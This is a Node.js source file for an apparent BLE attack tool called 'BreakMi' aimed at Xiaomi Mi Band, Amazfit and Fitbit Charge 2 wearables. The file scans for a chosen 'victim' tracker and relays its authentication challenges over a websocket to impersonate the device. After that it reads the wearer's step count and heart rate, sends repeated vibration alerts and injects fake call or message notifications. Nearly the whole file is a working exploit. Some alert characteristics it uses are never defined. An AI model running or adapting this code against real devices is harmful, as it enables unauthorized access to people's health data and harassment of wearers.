const async = require('async');
const noble = require('noble');
const prompt = require('prompt');
const aescross = require('aes-cross');
const http = require('http').createServer();
const io = require('socket.io')(3000, 'localhost');

const PeripheralConstants = require('./peripheral-implementation/peripheral-constants');

var peripheralArray = new Array();
var victimDevice;
var victimBLEMAC;
var foundVictim = false;

var targetPlatform = "undefined";
var authkey;
var notify = false;

// Xiaomi

var authCharacteristic;
var stepsCharacteristic;
var heartrateMeasurementCharacteristic;
var heartrateControlPointCharacteristic;

// Fitbit

var challengeFitbit = false;

var requestFitbitCharacteristic;
var responseFitbitCharacteristic;
var infoFitbitCharacteristic;

io.on("connection", socket => {

	// Xiaomi
	socket.on("challenge-request", () => {
		console.log("\n---\nWebsocket received challenge-request\n---\n");
		if (authCharacteristic)
			replayMiband(socket);
	});
	
	socket.on("challenge-solution", (solution) => {
		console.log("\n---\nWebsocket received challenge-solution: " + solution + '\n---\n');
		if (authCharacteristic)
			sendMibandChallengeSolution(solution);
	});
	
	// Fitbit
	socket.on("fitbit-start", () => {
		console.log("\n---\nWebsocket received fitbit-start\n---\n");
		if (responseFitbitCharacteristic)
			replayFitbit(socket);
	});
	
	socket.on("fitbit-command", (command) => {
		console.log("\n---\nWebsocket received fitbit-command\n---\n");
		if (responseFitbitCharacteristic)
			forwardFitbit(command);
	});
	
});

const messageOpenProperties =
[{
	description: 'Submit a message for the fake alert',
	name: 'message'
}];

const nineChoiceProperties =
[{
	description: 'Submit a number between 1 and 9',
	name: 'choice',
	validator: /^[1-9]$/,
	warning: 'Your choice must be a number between 1 and 9'
}];

const fiveChoiceProperties =
[{
	description: 'Submit a number',
	name: 'choice',
	validator: /^[1-5]$/,
	warning: 'Your choice must be a number between 1 and 5'
}];

const twoChoiceProperties =
[{
	description: 'Submit a number',
	name: 'choice',
	validator: /^[1-2]$/,
	warning: 'Your choice must be a number between 1 and 2'
}];

const peripheralChoiceProperties =
[{
	description: 'Submit a BLE peripheral',
	name: 'choice',
	warning: 'Your choice must be the number of a BLE peripheral'
}];

function onErr(err) {
    console.log(err);
    return 1;
}

function getProtocolVersion() {
	var deviceModel = victimDevice.advertisement.localName;
    	if (deviceModel == PeripheralConstants.NAME_AF2 || deviceModel == PeripheralConstants.NAME_MB2 || deviceModel == PeripheralConstants.NAME_MB3)
		return 1;
    	else if (deviceModel == PeripheralConstants.NAME_MB4 || deviceModel == PeripheralConstants.NAME_MB5)
		return 2;
	else if (deviceModel == PeripheralConstants.NAME_FC2)
		return 3;
    	else
		return 0;
}

noble.on('stateChange', function(state) {
	
    if (state === 'poweredOn') {
		
		setTimeout(function() { run(); }, 500);
		
		function run() {
			prompt.start();
			console.info("\nPlease select a target platform (1-2): \n1) Xiaomi \n2) Fitbit \n\n");
			prompt.get(twoChoiceProperties, function (err, result) {
				if (err) { return onErr(err); }
				if (result.choice == "1") {
					targetPlatform = "xiaomi";
					var serviceUuids = ['fee0','fee1']; 
					var allowDuplicates = false ;
					noble.startScanning(serviceUuids, allowDuplicates);
					setTimeout(enumeratePeripherals, 4000);
				}
				else if (result.choice == "2") {
					targetPlatform = "fitbit";
					var serviceUuids = ['558dfa004fa841059f024eaa93e62980','adabfb006e7d4601bda2bffaa68956ba']; 
					var allowDuplicates = false ;
					noble.startScanning(serviceUuids, allowDuplicates);
					setTimeout(enumeratePeripherals, 4000);
				}
				
			});
		}
	}
});

noble.on('discover', function(peripheral) {
	console.log('\n' + peripheral.advertisement.localName + ' (' + peripheral.address + ')' + ' has been found');
	peripheralArray.push(peripheral);
});

function enumeratePeripherals() {
	
	noble.stopScanning();
	if (peripheralArray.length <= 0) {
		console.info("No nearby BLE peripherals detected.");
	}
	else {
		prompt.start();
		var choicesText = "\n\nPlease select a target BLE peripheral (1-" + peripheralArray.length + "): \n";
		var choicesEnd = "";
		
		var count = 0;
		peripheralArray.forEach(function(p) {
			count = count + 1;
			choicesText = choicesText + " \n" + count.toString() +  ") " + p.advertisement.localName + " (" + p.address + ") \n";
		});
		choicesText = choicesText + "\n";
	}
	
	console.info(choicesText);
	prompt.get(peripheralChoiceProperties, function (err, result) {
		if (err) { return onErr(err); }
		victimDevice = peripheralArray[parseInt(result.choice)-1];
		
		if (targetPlatform == "xiaomi") { 
			targetArray = [PeripheralConstants.NAME_AF2, PeripheralConstants.NAME_MB2, PeripheralConstants.NAME_MB3, PeripheralConstants.NAME_MB4, PeripheralConstants.NAME_MB5]; 
		}
		else if (targetPlatform == "fitbit") {
			targetArray = [PeripheralConstants.NAME_FC2];
		}
		
		targetArray.forEach(function(t) {
			if (t == victimDevice.advertisement.localName) {
				victimBLEMAC = victimDevice.address;
				foundVictim = true;
			}
		});
		
		if (foundVictim) { interact(); }
		else { console.info("\nUnsupported peripheral, closing BreakMi.."); process.exit(0); }
	});
}

function interact() {
	
	victimDevice.on('disconnect', function() {
		console.log('BLE peripheral was disconnected');
		process.exit(0);
	});
	
	victimDevice.connect(function(error) {
		console.log('BLE peripheral is connected');
		noble.stopScanning();
		discovery();
		
		function discovery() {
			victimDevice.discoverServices(null, function(error, services) {
				for (var i in services) {
					services[i].discoverCharacteristics(null, function(error, characteristics) {
						for (var j in characteristics) {
							if (characteristics[j].uuid == '000000090000351221180009af100700')
								authCharacteristic = characteristics[j];
							else if (characteristics[j].uuid == '000000070000351221180009af100700')
								stepsCharacteristic = characteristics[j];
							else if (characteristics[j].uuid == '2a37')
								heartrateMeasurementCharacteristic = characteristics[j];
							else if (characteristics[j].uuid == '2a39')
								heartrateControlPointCharacteristic = characteristics[j];
							else if (characteristics[j].uuid == 'adabfb016e7d4601bda2bffaa68956ba')
								responseFitbitCharacteristic = characteristics[j];
							else if (characteristics[j].uuid == 'adabfb026e7d4601bda2bffaa68956ba')
								requestFitbitCharacteristic = characteristics[j];
							else if (characteristics[j].uuid == '558dfa014fa841059f024eaa93e62980')
								infoFitbitCharacteristic = characteristics[j];
						}
					});
				}
			});
			
			if (targetPlatform == "fitbit") {
				setTimeout(subscribeResponse, 2000);
			
				function subscribeResponse() {
					responseFitbitCharacteristic.subscribe(function(error) {
						console.log('\nEnabled notifications from Fitbit');
					});
				}
			}
			
		}
		
	});
	
}

function replayMiband(socket) {
	
	authCharacteristic.subscribe(function(error) {
		console.log('\nEnabled notifications on Auth Characteristic');
		const opcodeBuf = new Buffer([0x01,0x00]);
		authCharacteristic.write(opcodeBuf, true, function(error) {
			console.log('Sent Hello message');
		});
		if (getProtocolVersion() == 1)
			setTimeout(function() { authentication(); }, 500);
	});
	
	authCharacteristic.on('data', function(data, isNotification) {
		console.info('\n\nAuth notification received');
		//console.log('  Hex value: ' + data.toString('hex'));
		//console.log('  UInt8 value: ' + data.readUInt8(0));
		if (data.toString('hex') == '100181011863c2cce5d159413bed92c4b163c279') {
			console.log('Received public key hash');
			authentication();
		} else if (data.toString('hex').substring(0,6) == '100201' || data.toString('hex').substring(0,6) == '108201') {
			console.log('Received challenge');
			var challenge = data.toString('hex').substring(6,38);
			replayChallenge(challenge);
		} else if (data.toString('hex') == '100204') {
			correctChallengeRequest();
		} else if (data.toString('hex') == '100301' || data.toString('hex') == '108301') {
			console.log('\nAuthentication completed');
			console.log('Peripheral Impersonation ended successfully. You can shut down this shell now.');
			setTimeout(function() { communicationMiband(); }, 2000);
		}
		console.log("end replay socket");
		
	});
	
	function authentication() {
		console.info("\nPerforming Authentication \n");
		if (getProtocolVersion() == 1)
			wrongChallengeRequest();
		else if (getProtocolVersion() == 2)
			correctChallengeRequest();
	}
	
	function correctChallengeRequest() {
		console.log('correct');
		var opcodeBuf;
		if (getProtocolVersion() == 1) {
			opcodeBuf = new Buffer([0x02,0x00]);
		} else if (getProtocolVersion() == 2) {
			opcodeBuf = new Buffer([0x82,0x00,0x02]);
		}
		authCharacteristic.write(opcodeBuf, true, function(error) {
			console.log('Sent Challenge Request');
		});
	}
	
	function wrongChallengeRequest() {
		console.log('wrong');
		const opcodeBuf = new Buffer([0x02,0x00,0x02]);
		authCharacteristic.write(opcodeBuf, true, function(error) {
			console.log('Sent Challenge Request');
		});
	}
	
	function replayChallenge(challenge) {
		console.log("\n---\nWebsocket sent challenge-value: " + challenge + '\n---\n');
		socket.emit("challenge-value", challenge);
	}
	
}



function sendMibandChallengeSolution(solution) {
	//console.log('inside challenge solution');
	var opcodeBuf;
	if (getProtocolVersion() == 1)
		opcodeBuf = new Buffer([0x03,0x00]);
	else if (getProtocolVersion() == 2)
		opcodeBuf = new Buffer([0x83,0x00]);
	const solutionBuf = new Buffer.from(solution, 'hex');
	var totalBufLength = opcodeBuf.length + solutionBuf.length;
	authCharacteristic.write(Buffer.concat([opcodeBuf,solutionBuf],totalBufLength), true, function(error) {
		console.log('Sent Challenge Solution: ' + solution.toString('hex'));
	});
}

function communicationMiband() {
	
	notifySteps();
	notifyHeartrate();
	
	prompt.start();
	console.info("\nHow do you want to exploit Communication? \n1) Read Steps \n2) Receive Steps notifications \n3) Receive Heart Rate notifications \n4) Vibration \n5) Exit\n\n");
	prompt.get(fiveChoiceProperties, function (err, result) {
		if (err) { return onErr(err); }
		if (result.choice == "1")
			readSteps();
		else if (result.choice == "2")
			subscribeSteps();
		else if (result.choice == "3")
			subscribeHeartrate();
		else if (result.choice == "4")
			repeatedAlert();
		else if (result.choice == "5")
			disconnect();
	});
	
	function readSteps() {
		stepsCharacteristic.read(function(error, data) {
			var steps;
			var deviceModel = victimDevice.advertisement.localName;
			if (deviceModel == PeripheralConstants.NAME_AF2) { steps = data.toString('hex'); }
			else if (deviceModel == PeripheralConstants.NAME_MB2 || deviceModel == PeripheralConstants.NAME_MB3 || deviceModel == PeripheralConstants.NAME_MB4 || deviceModel == PeripheralConstants.NAME_MB5) { steps = parseInt(data.toString('hex').substr(2,2),16); }
			else { steps = data.toString('hex'); }
			console.log('\nSteps: ' + steps);
		});
		setTimeout(communicationMiband, 1000);
	}
	
	function subscribeSteps() {
		stepsCharacteristic.subscribe(function(error) {
			console.log('\nEnabled notifications on Steps Characteristic\n');
			setTimeout(function() { unsubscribeSteps(); }, 20000);
		});
	}

	function subscribeHeartrate() {
		heartrateMeasurementCharacteristic.subscribe(function(error) {
			console.log('\nEnabled notifications on Heart Rate Characteristic\n');
			setTimeout(function() { unsubscribeHeartrate(); }, 20000);
		});
	}
	
	function unsubscribeSteps() {
		stepsCharacteristic.unsubscribe(function(error) {
			console.log('\nDisabled notifications on Steps Characteristic');
		});
		setTimeout(communicationMiband, 1000);
	}
	
	function unsubscribeHeartrate() {
		heartrateMeasurementCharacteristic.unsubscribe(function(error) {
			console.log('\nDisabled notifications on Heart Rate Characteristic');
		});
		setTimeout(communicationMiband, 1000);
	}
	
	function notifySteps() {
		stepsCharacteristic.on('data', function(data, isNotification) {
			var steps;
			var deviceModel = victimDevice.advertisement.localName;
			if (deviceModel == PeripheralConstants.NAME_AF2 || deviceModel == PeripheralConstants.NAME_MB2) { steps = parseInt(data.toString('hex').substr(0,4),16); }
			else if (deviceModel == PeripheralConstants.NAME_MB3 || deviceModel == PeripheralConstants.NAME_MB4 || deviceModel == PeripheralConstants.NAME_MB5) { steps = parseInt(data.toString('hex').substr(2,2),16); }
			else { steps = data.toString('hex'); }
			console.log('Received Steps notification: ' + steps);
		});
	}
	
	function notifyHeartrate() {
		heartrateMeasurementCharacteristic.on('data', function(data, isNotification) {
			var heartrate = parseInt(data.toString('hex').substr(0,4),16);
			console.log('Received Heart Rate notification: ' + heartrate);
		});
	}
	
	function repeatedAlert() {
		console.log('Repeated Alert');
		var opcodeBuf;
		opcodeBuf = new Buffer([0x03]);
		immediateAlertCharacteristic.write(opcodeBuf, true, function(error) {
			console.log('Sent alert');
		});
		setTimeout(repeatedAlert, 2000);
		setTimeout(communicationMiband, 1000);
	}
	
	function fakeAlert() {
		
		var categBuf;
		prompt.start();
		console.info("\nWhat kind of fake alert do you want to send? \n1) Email \n2) News feed \n3) Incoming call \n4) Missed call \n5) SMS/MMS \n6) Voice mail \n7) Calendar \n8) High priority \n9) Instant message\n\n");
		prompt.get(nineChoiceProperties, function (err, result) {
			if (err) { return onErr(err); }
			if (result.choice == "1")
				categBuf = "0101";
			else if (result.choice == "2")
				categBuf = "0201";
			else if (result.choice == "3")
				categBuf = "0301";
			else if (result.choice == "4")
				categBuf = "0401";
			else if (result.choice == "5")
				categBuf = "0501";
			else if (result.choice == "6")
				categBuf = "0601";
			else if (result.choice == "7")
				categBuf = "0701";
			else if (result.choice == "8")
				categBuf = "0801";
			else if (result.choice == "9")
				categBuf = "0901";
			categBuf = new Buffer.from(categBuf,'hex');
			chooseMessage(categBuf);
		});		
		
		function chooseMessage(categBuf) {
			prompt.start();
			console.info("\nWrite a message for the fake alert.");
			prompt.get(messageOpenProperties, function (err, result) {
				var messageBuf = new Buffer.from(result.message);
				var totalBufLength = categBuf.length + messageBuf.length;
				newAlertCharacteristic.write(Buffer.concat([categBuf,messageBuf],totalBufLength), false, function(error) {
					console.log('Sent fake alert');
				});
				setTimeout(communicationMiband, 1000);
			});
		}
		
	}
	
	function disconnect() {
		authCharacteristic.unsubscribe(function(error) {
			console.log('\nDisabled notifications on Auth Characteristic');
		});
		stepsCharacteristic.unsubscribe(function(error) {
			console.log('\nDisabled notifications on Steps Characteristic');
		});
		heartrateMeasurementCharacteristic.unsubscribe(function(error) {
			console.log('\nDisabled notifications on Heart Rate Characteristic');
		});
		setTimeout(goodbye,2000);
	}
	
	function goodbye() { console.log('\nGoodbye. Have a nice break!'); process.exit(0); }
	
}

function replayFitbit(socket) {
	
	responseFitbitCharacteristic.on('data', function(data, isNotification) {
		console.info('\nNotification ' + data.toString('hex') + ' received from Legitimate Fitbit Tracker');
		socket.emit("fitbit-notification", data.toString('hex'));
		//console.log('  Hex value: ' + data.toString('hex'));
		//console.log('  UInt8 value: ' + data.readUInt8(0));
		if (data.length > 2 && data.toString('hex').substring(0,4) == 'c051') {
			console.log('Received challenge');
			var challenge = data.toString('hex').substring(4,28);
			challengeFitbit = true;
			setTimeout(function() { communicationFitbit(); }, 2000);
		} else if (data.length > 2 && data.toString('hex').substring(0,4) == 'c002' && challengeFitbit) {
			console.log('\nAuthentication completed. You can shut down the counterfeit tracker now.');
			//console.log('Replay attack ended. You can shut down the counterfeit tracker now.');
			setTimeout(function() { communicationFitbit(); }, 2000);
		}
		//console.log("end replay");
		//setTimeout(function() { communicationFitbit(); }, 2000);
	});
	
	infoFitbitCharacteristic.on('data', function(data, isNotification) {
		console.info('\n\Info ' + data.toString('hex') + ' received from Legitimate Fitbit Tracker');
		socket.emit("fitbit-info", data.toString('hex'));
		//console.log('  Hex value: ' + data.toString('hex'));
		//console.log('  UInt8 value: ' + data.readUInt8(0));
		if (data.length > 2 && data.toString('hex').substring(0,4) == 'c051') {
			console.log('Received challenge');
			var challenge = data.toString('hex').substring(4,28);
			challengeFitbit = true;
			//setTimeout(function() { communicationFitbit(); }, 2000);
		} else if (data.length >= 2 && data.toString('hex').substring(0,4) == 'c002' && challengeFitbit) {
			console.log('\nAuthentication completed. You can shut down the counterfeit tracker now.');
			setTimeout(function() { communicationFitbit(); }, 2000);
		}
		//console.log("end replay");
		//setTimeout(function() { communicationFitbit(); }, 2000);
	});
	
}

function forwardFitbit(command) {
	var buf = new Buffer(command, 'hex');
	requestFitbitCharacteristic.write(buf, true, function(error) {
		console.log('Forwarded command ' + command.toString('hex') + " to Legitimate Fitbit Tracker");
	});
}

function communicationFitbit() {
	
	subscribeInfo();
	
	prompt.start();
	console.info("\nHow do you want to exploit Communication? \n1) Notify Info \n2) Exit\n\n");
	prompt.get(twoChoiceProperties, function (err, result) {
		if (err) { return onErr(err); }
		if (result.choice == "1")
			notifyInfo();
		else if (result.choice == "2")
			disconnect();
	});
	
	function readInfo() {
		infoFitbitCharacteristic.read(function(error, data) {
			var steps;
			var deviceModel = victimDevice.advertisement.localName;
			if (deviceModel == 'Charge 2')
				steps = data.toString('hex');
			else
				console.log('Device info not supported');
			console.log('\nSteps: ' + steps);
		});
		setTimeout(communicationFitbit, 1000);
	}
	
	function subscribeInfo() {
		infoFitbitCharacteristic.subscribe(function(error) {
			console.log('\nEnabled notifications on Info Characteristic\n');
			//setTimeout(function() { unsubscribeInfo(); }, 20000);
		});
	}
	
	function unsubscribeInfo() {
		infoFitbitCharacteristic.unsubscribe(function(error) {
			console.log('\nDisabled notifications on Info Characteristic');
		});
		//setTimeout(communicationFitbit, 1000);
	}
	
	function notifyInfo() {
	const opcodeBuf0 = new Buffer([0xc0,0x01]);
		requestFitbitCharacteristic.write(opcodeBuf0, true, function(error) {
			console.log('Sent info request');
		});
		const opcodeBuf = new Buffer([0x01,0x00]);
		infoFitbitCharacteristic.write(opcodeBuf, false, function(error) {
			console.log('Sent info request');
		});
		infoFitbitCharacteristic.on('data', function(data, isNotification) {
			var info = 'ciao';
			var deviceModel = victimDevice.advertisement.localName;
			if (deviceModel == 'Charge 2')
				info = data.toString('hex');
			console.log('Received Info notification: ' + info);
		});
	}
	
	function disconnect() {
		responseFitbitCharacteristic.unsubscribe(function(error) {
			console.log('\nDisabled notifications on Response Characteristic');
		});
		infoFitbitCharacteristic.unsubscribe(function(error) {
			console.log('\nDisabled notifications on Info Characteristic');
		});
		setTimeout(goodbye, 2000);
	}
	
	function goodbye() {
		console.log('\nGoodbye. Have a nice break!');
		process.exit(0);
	}
	
}


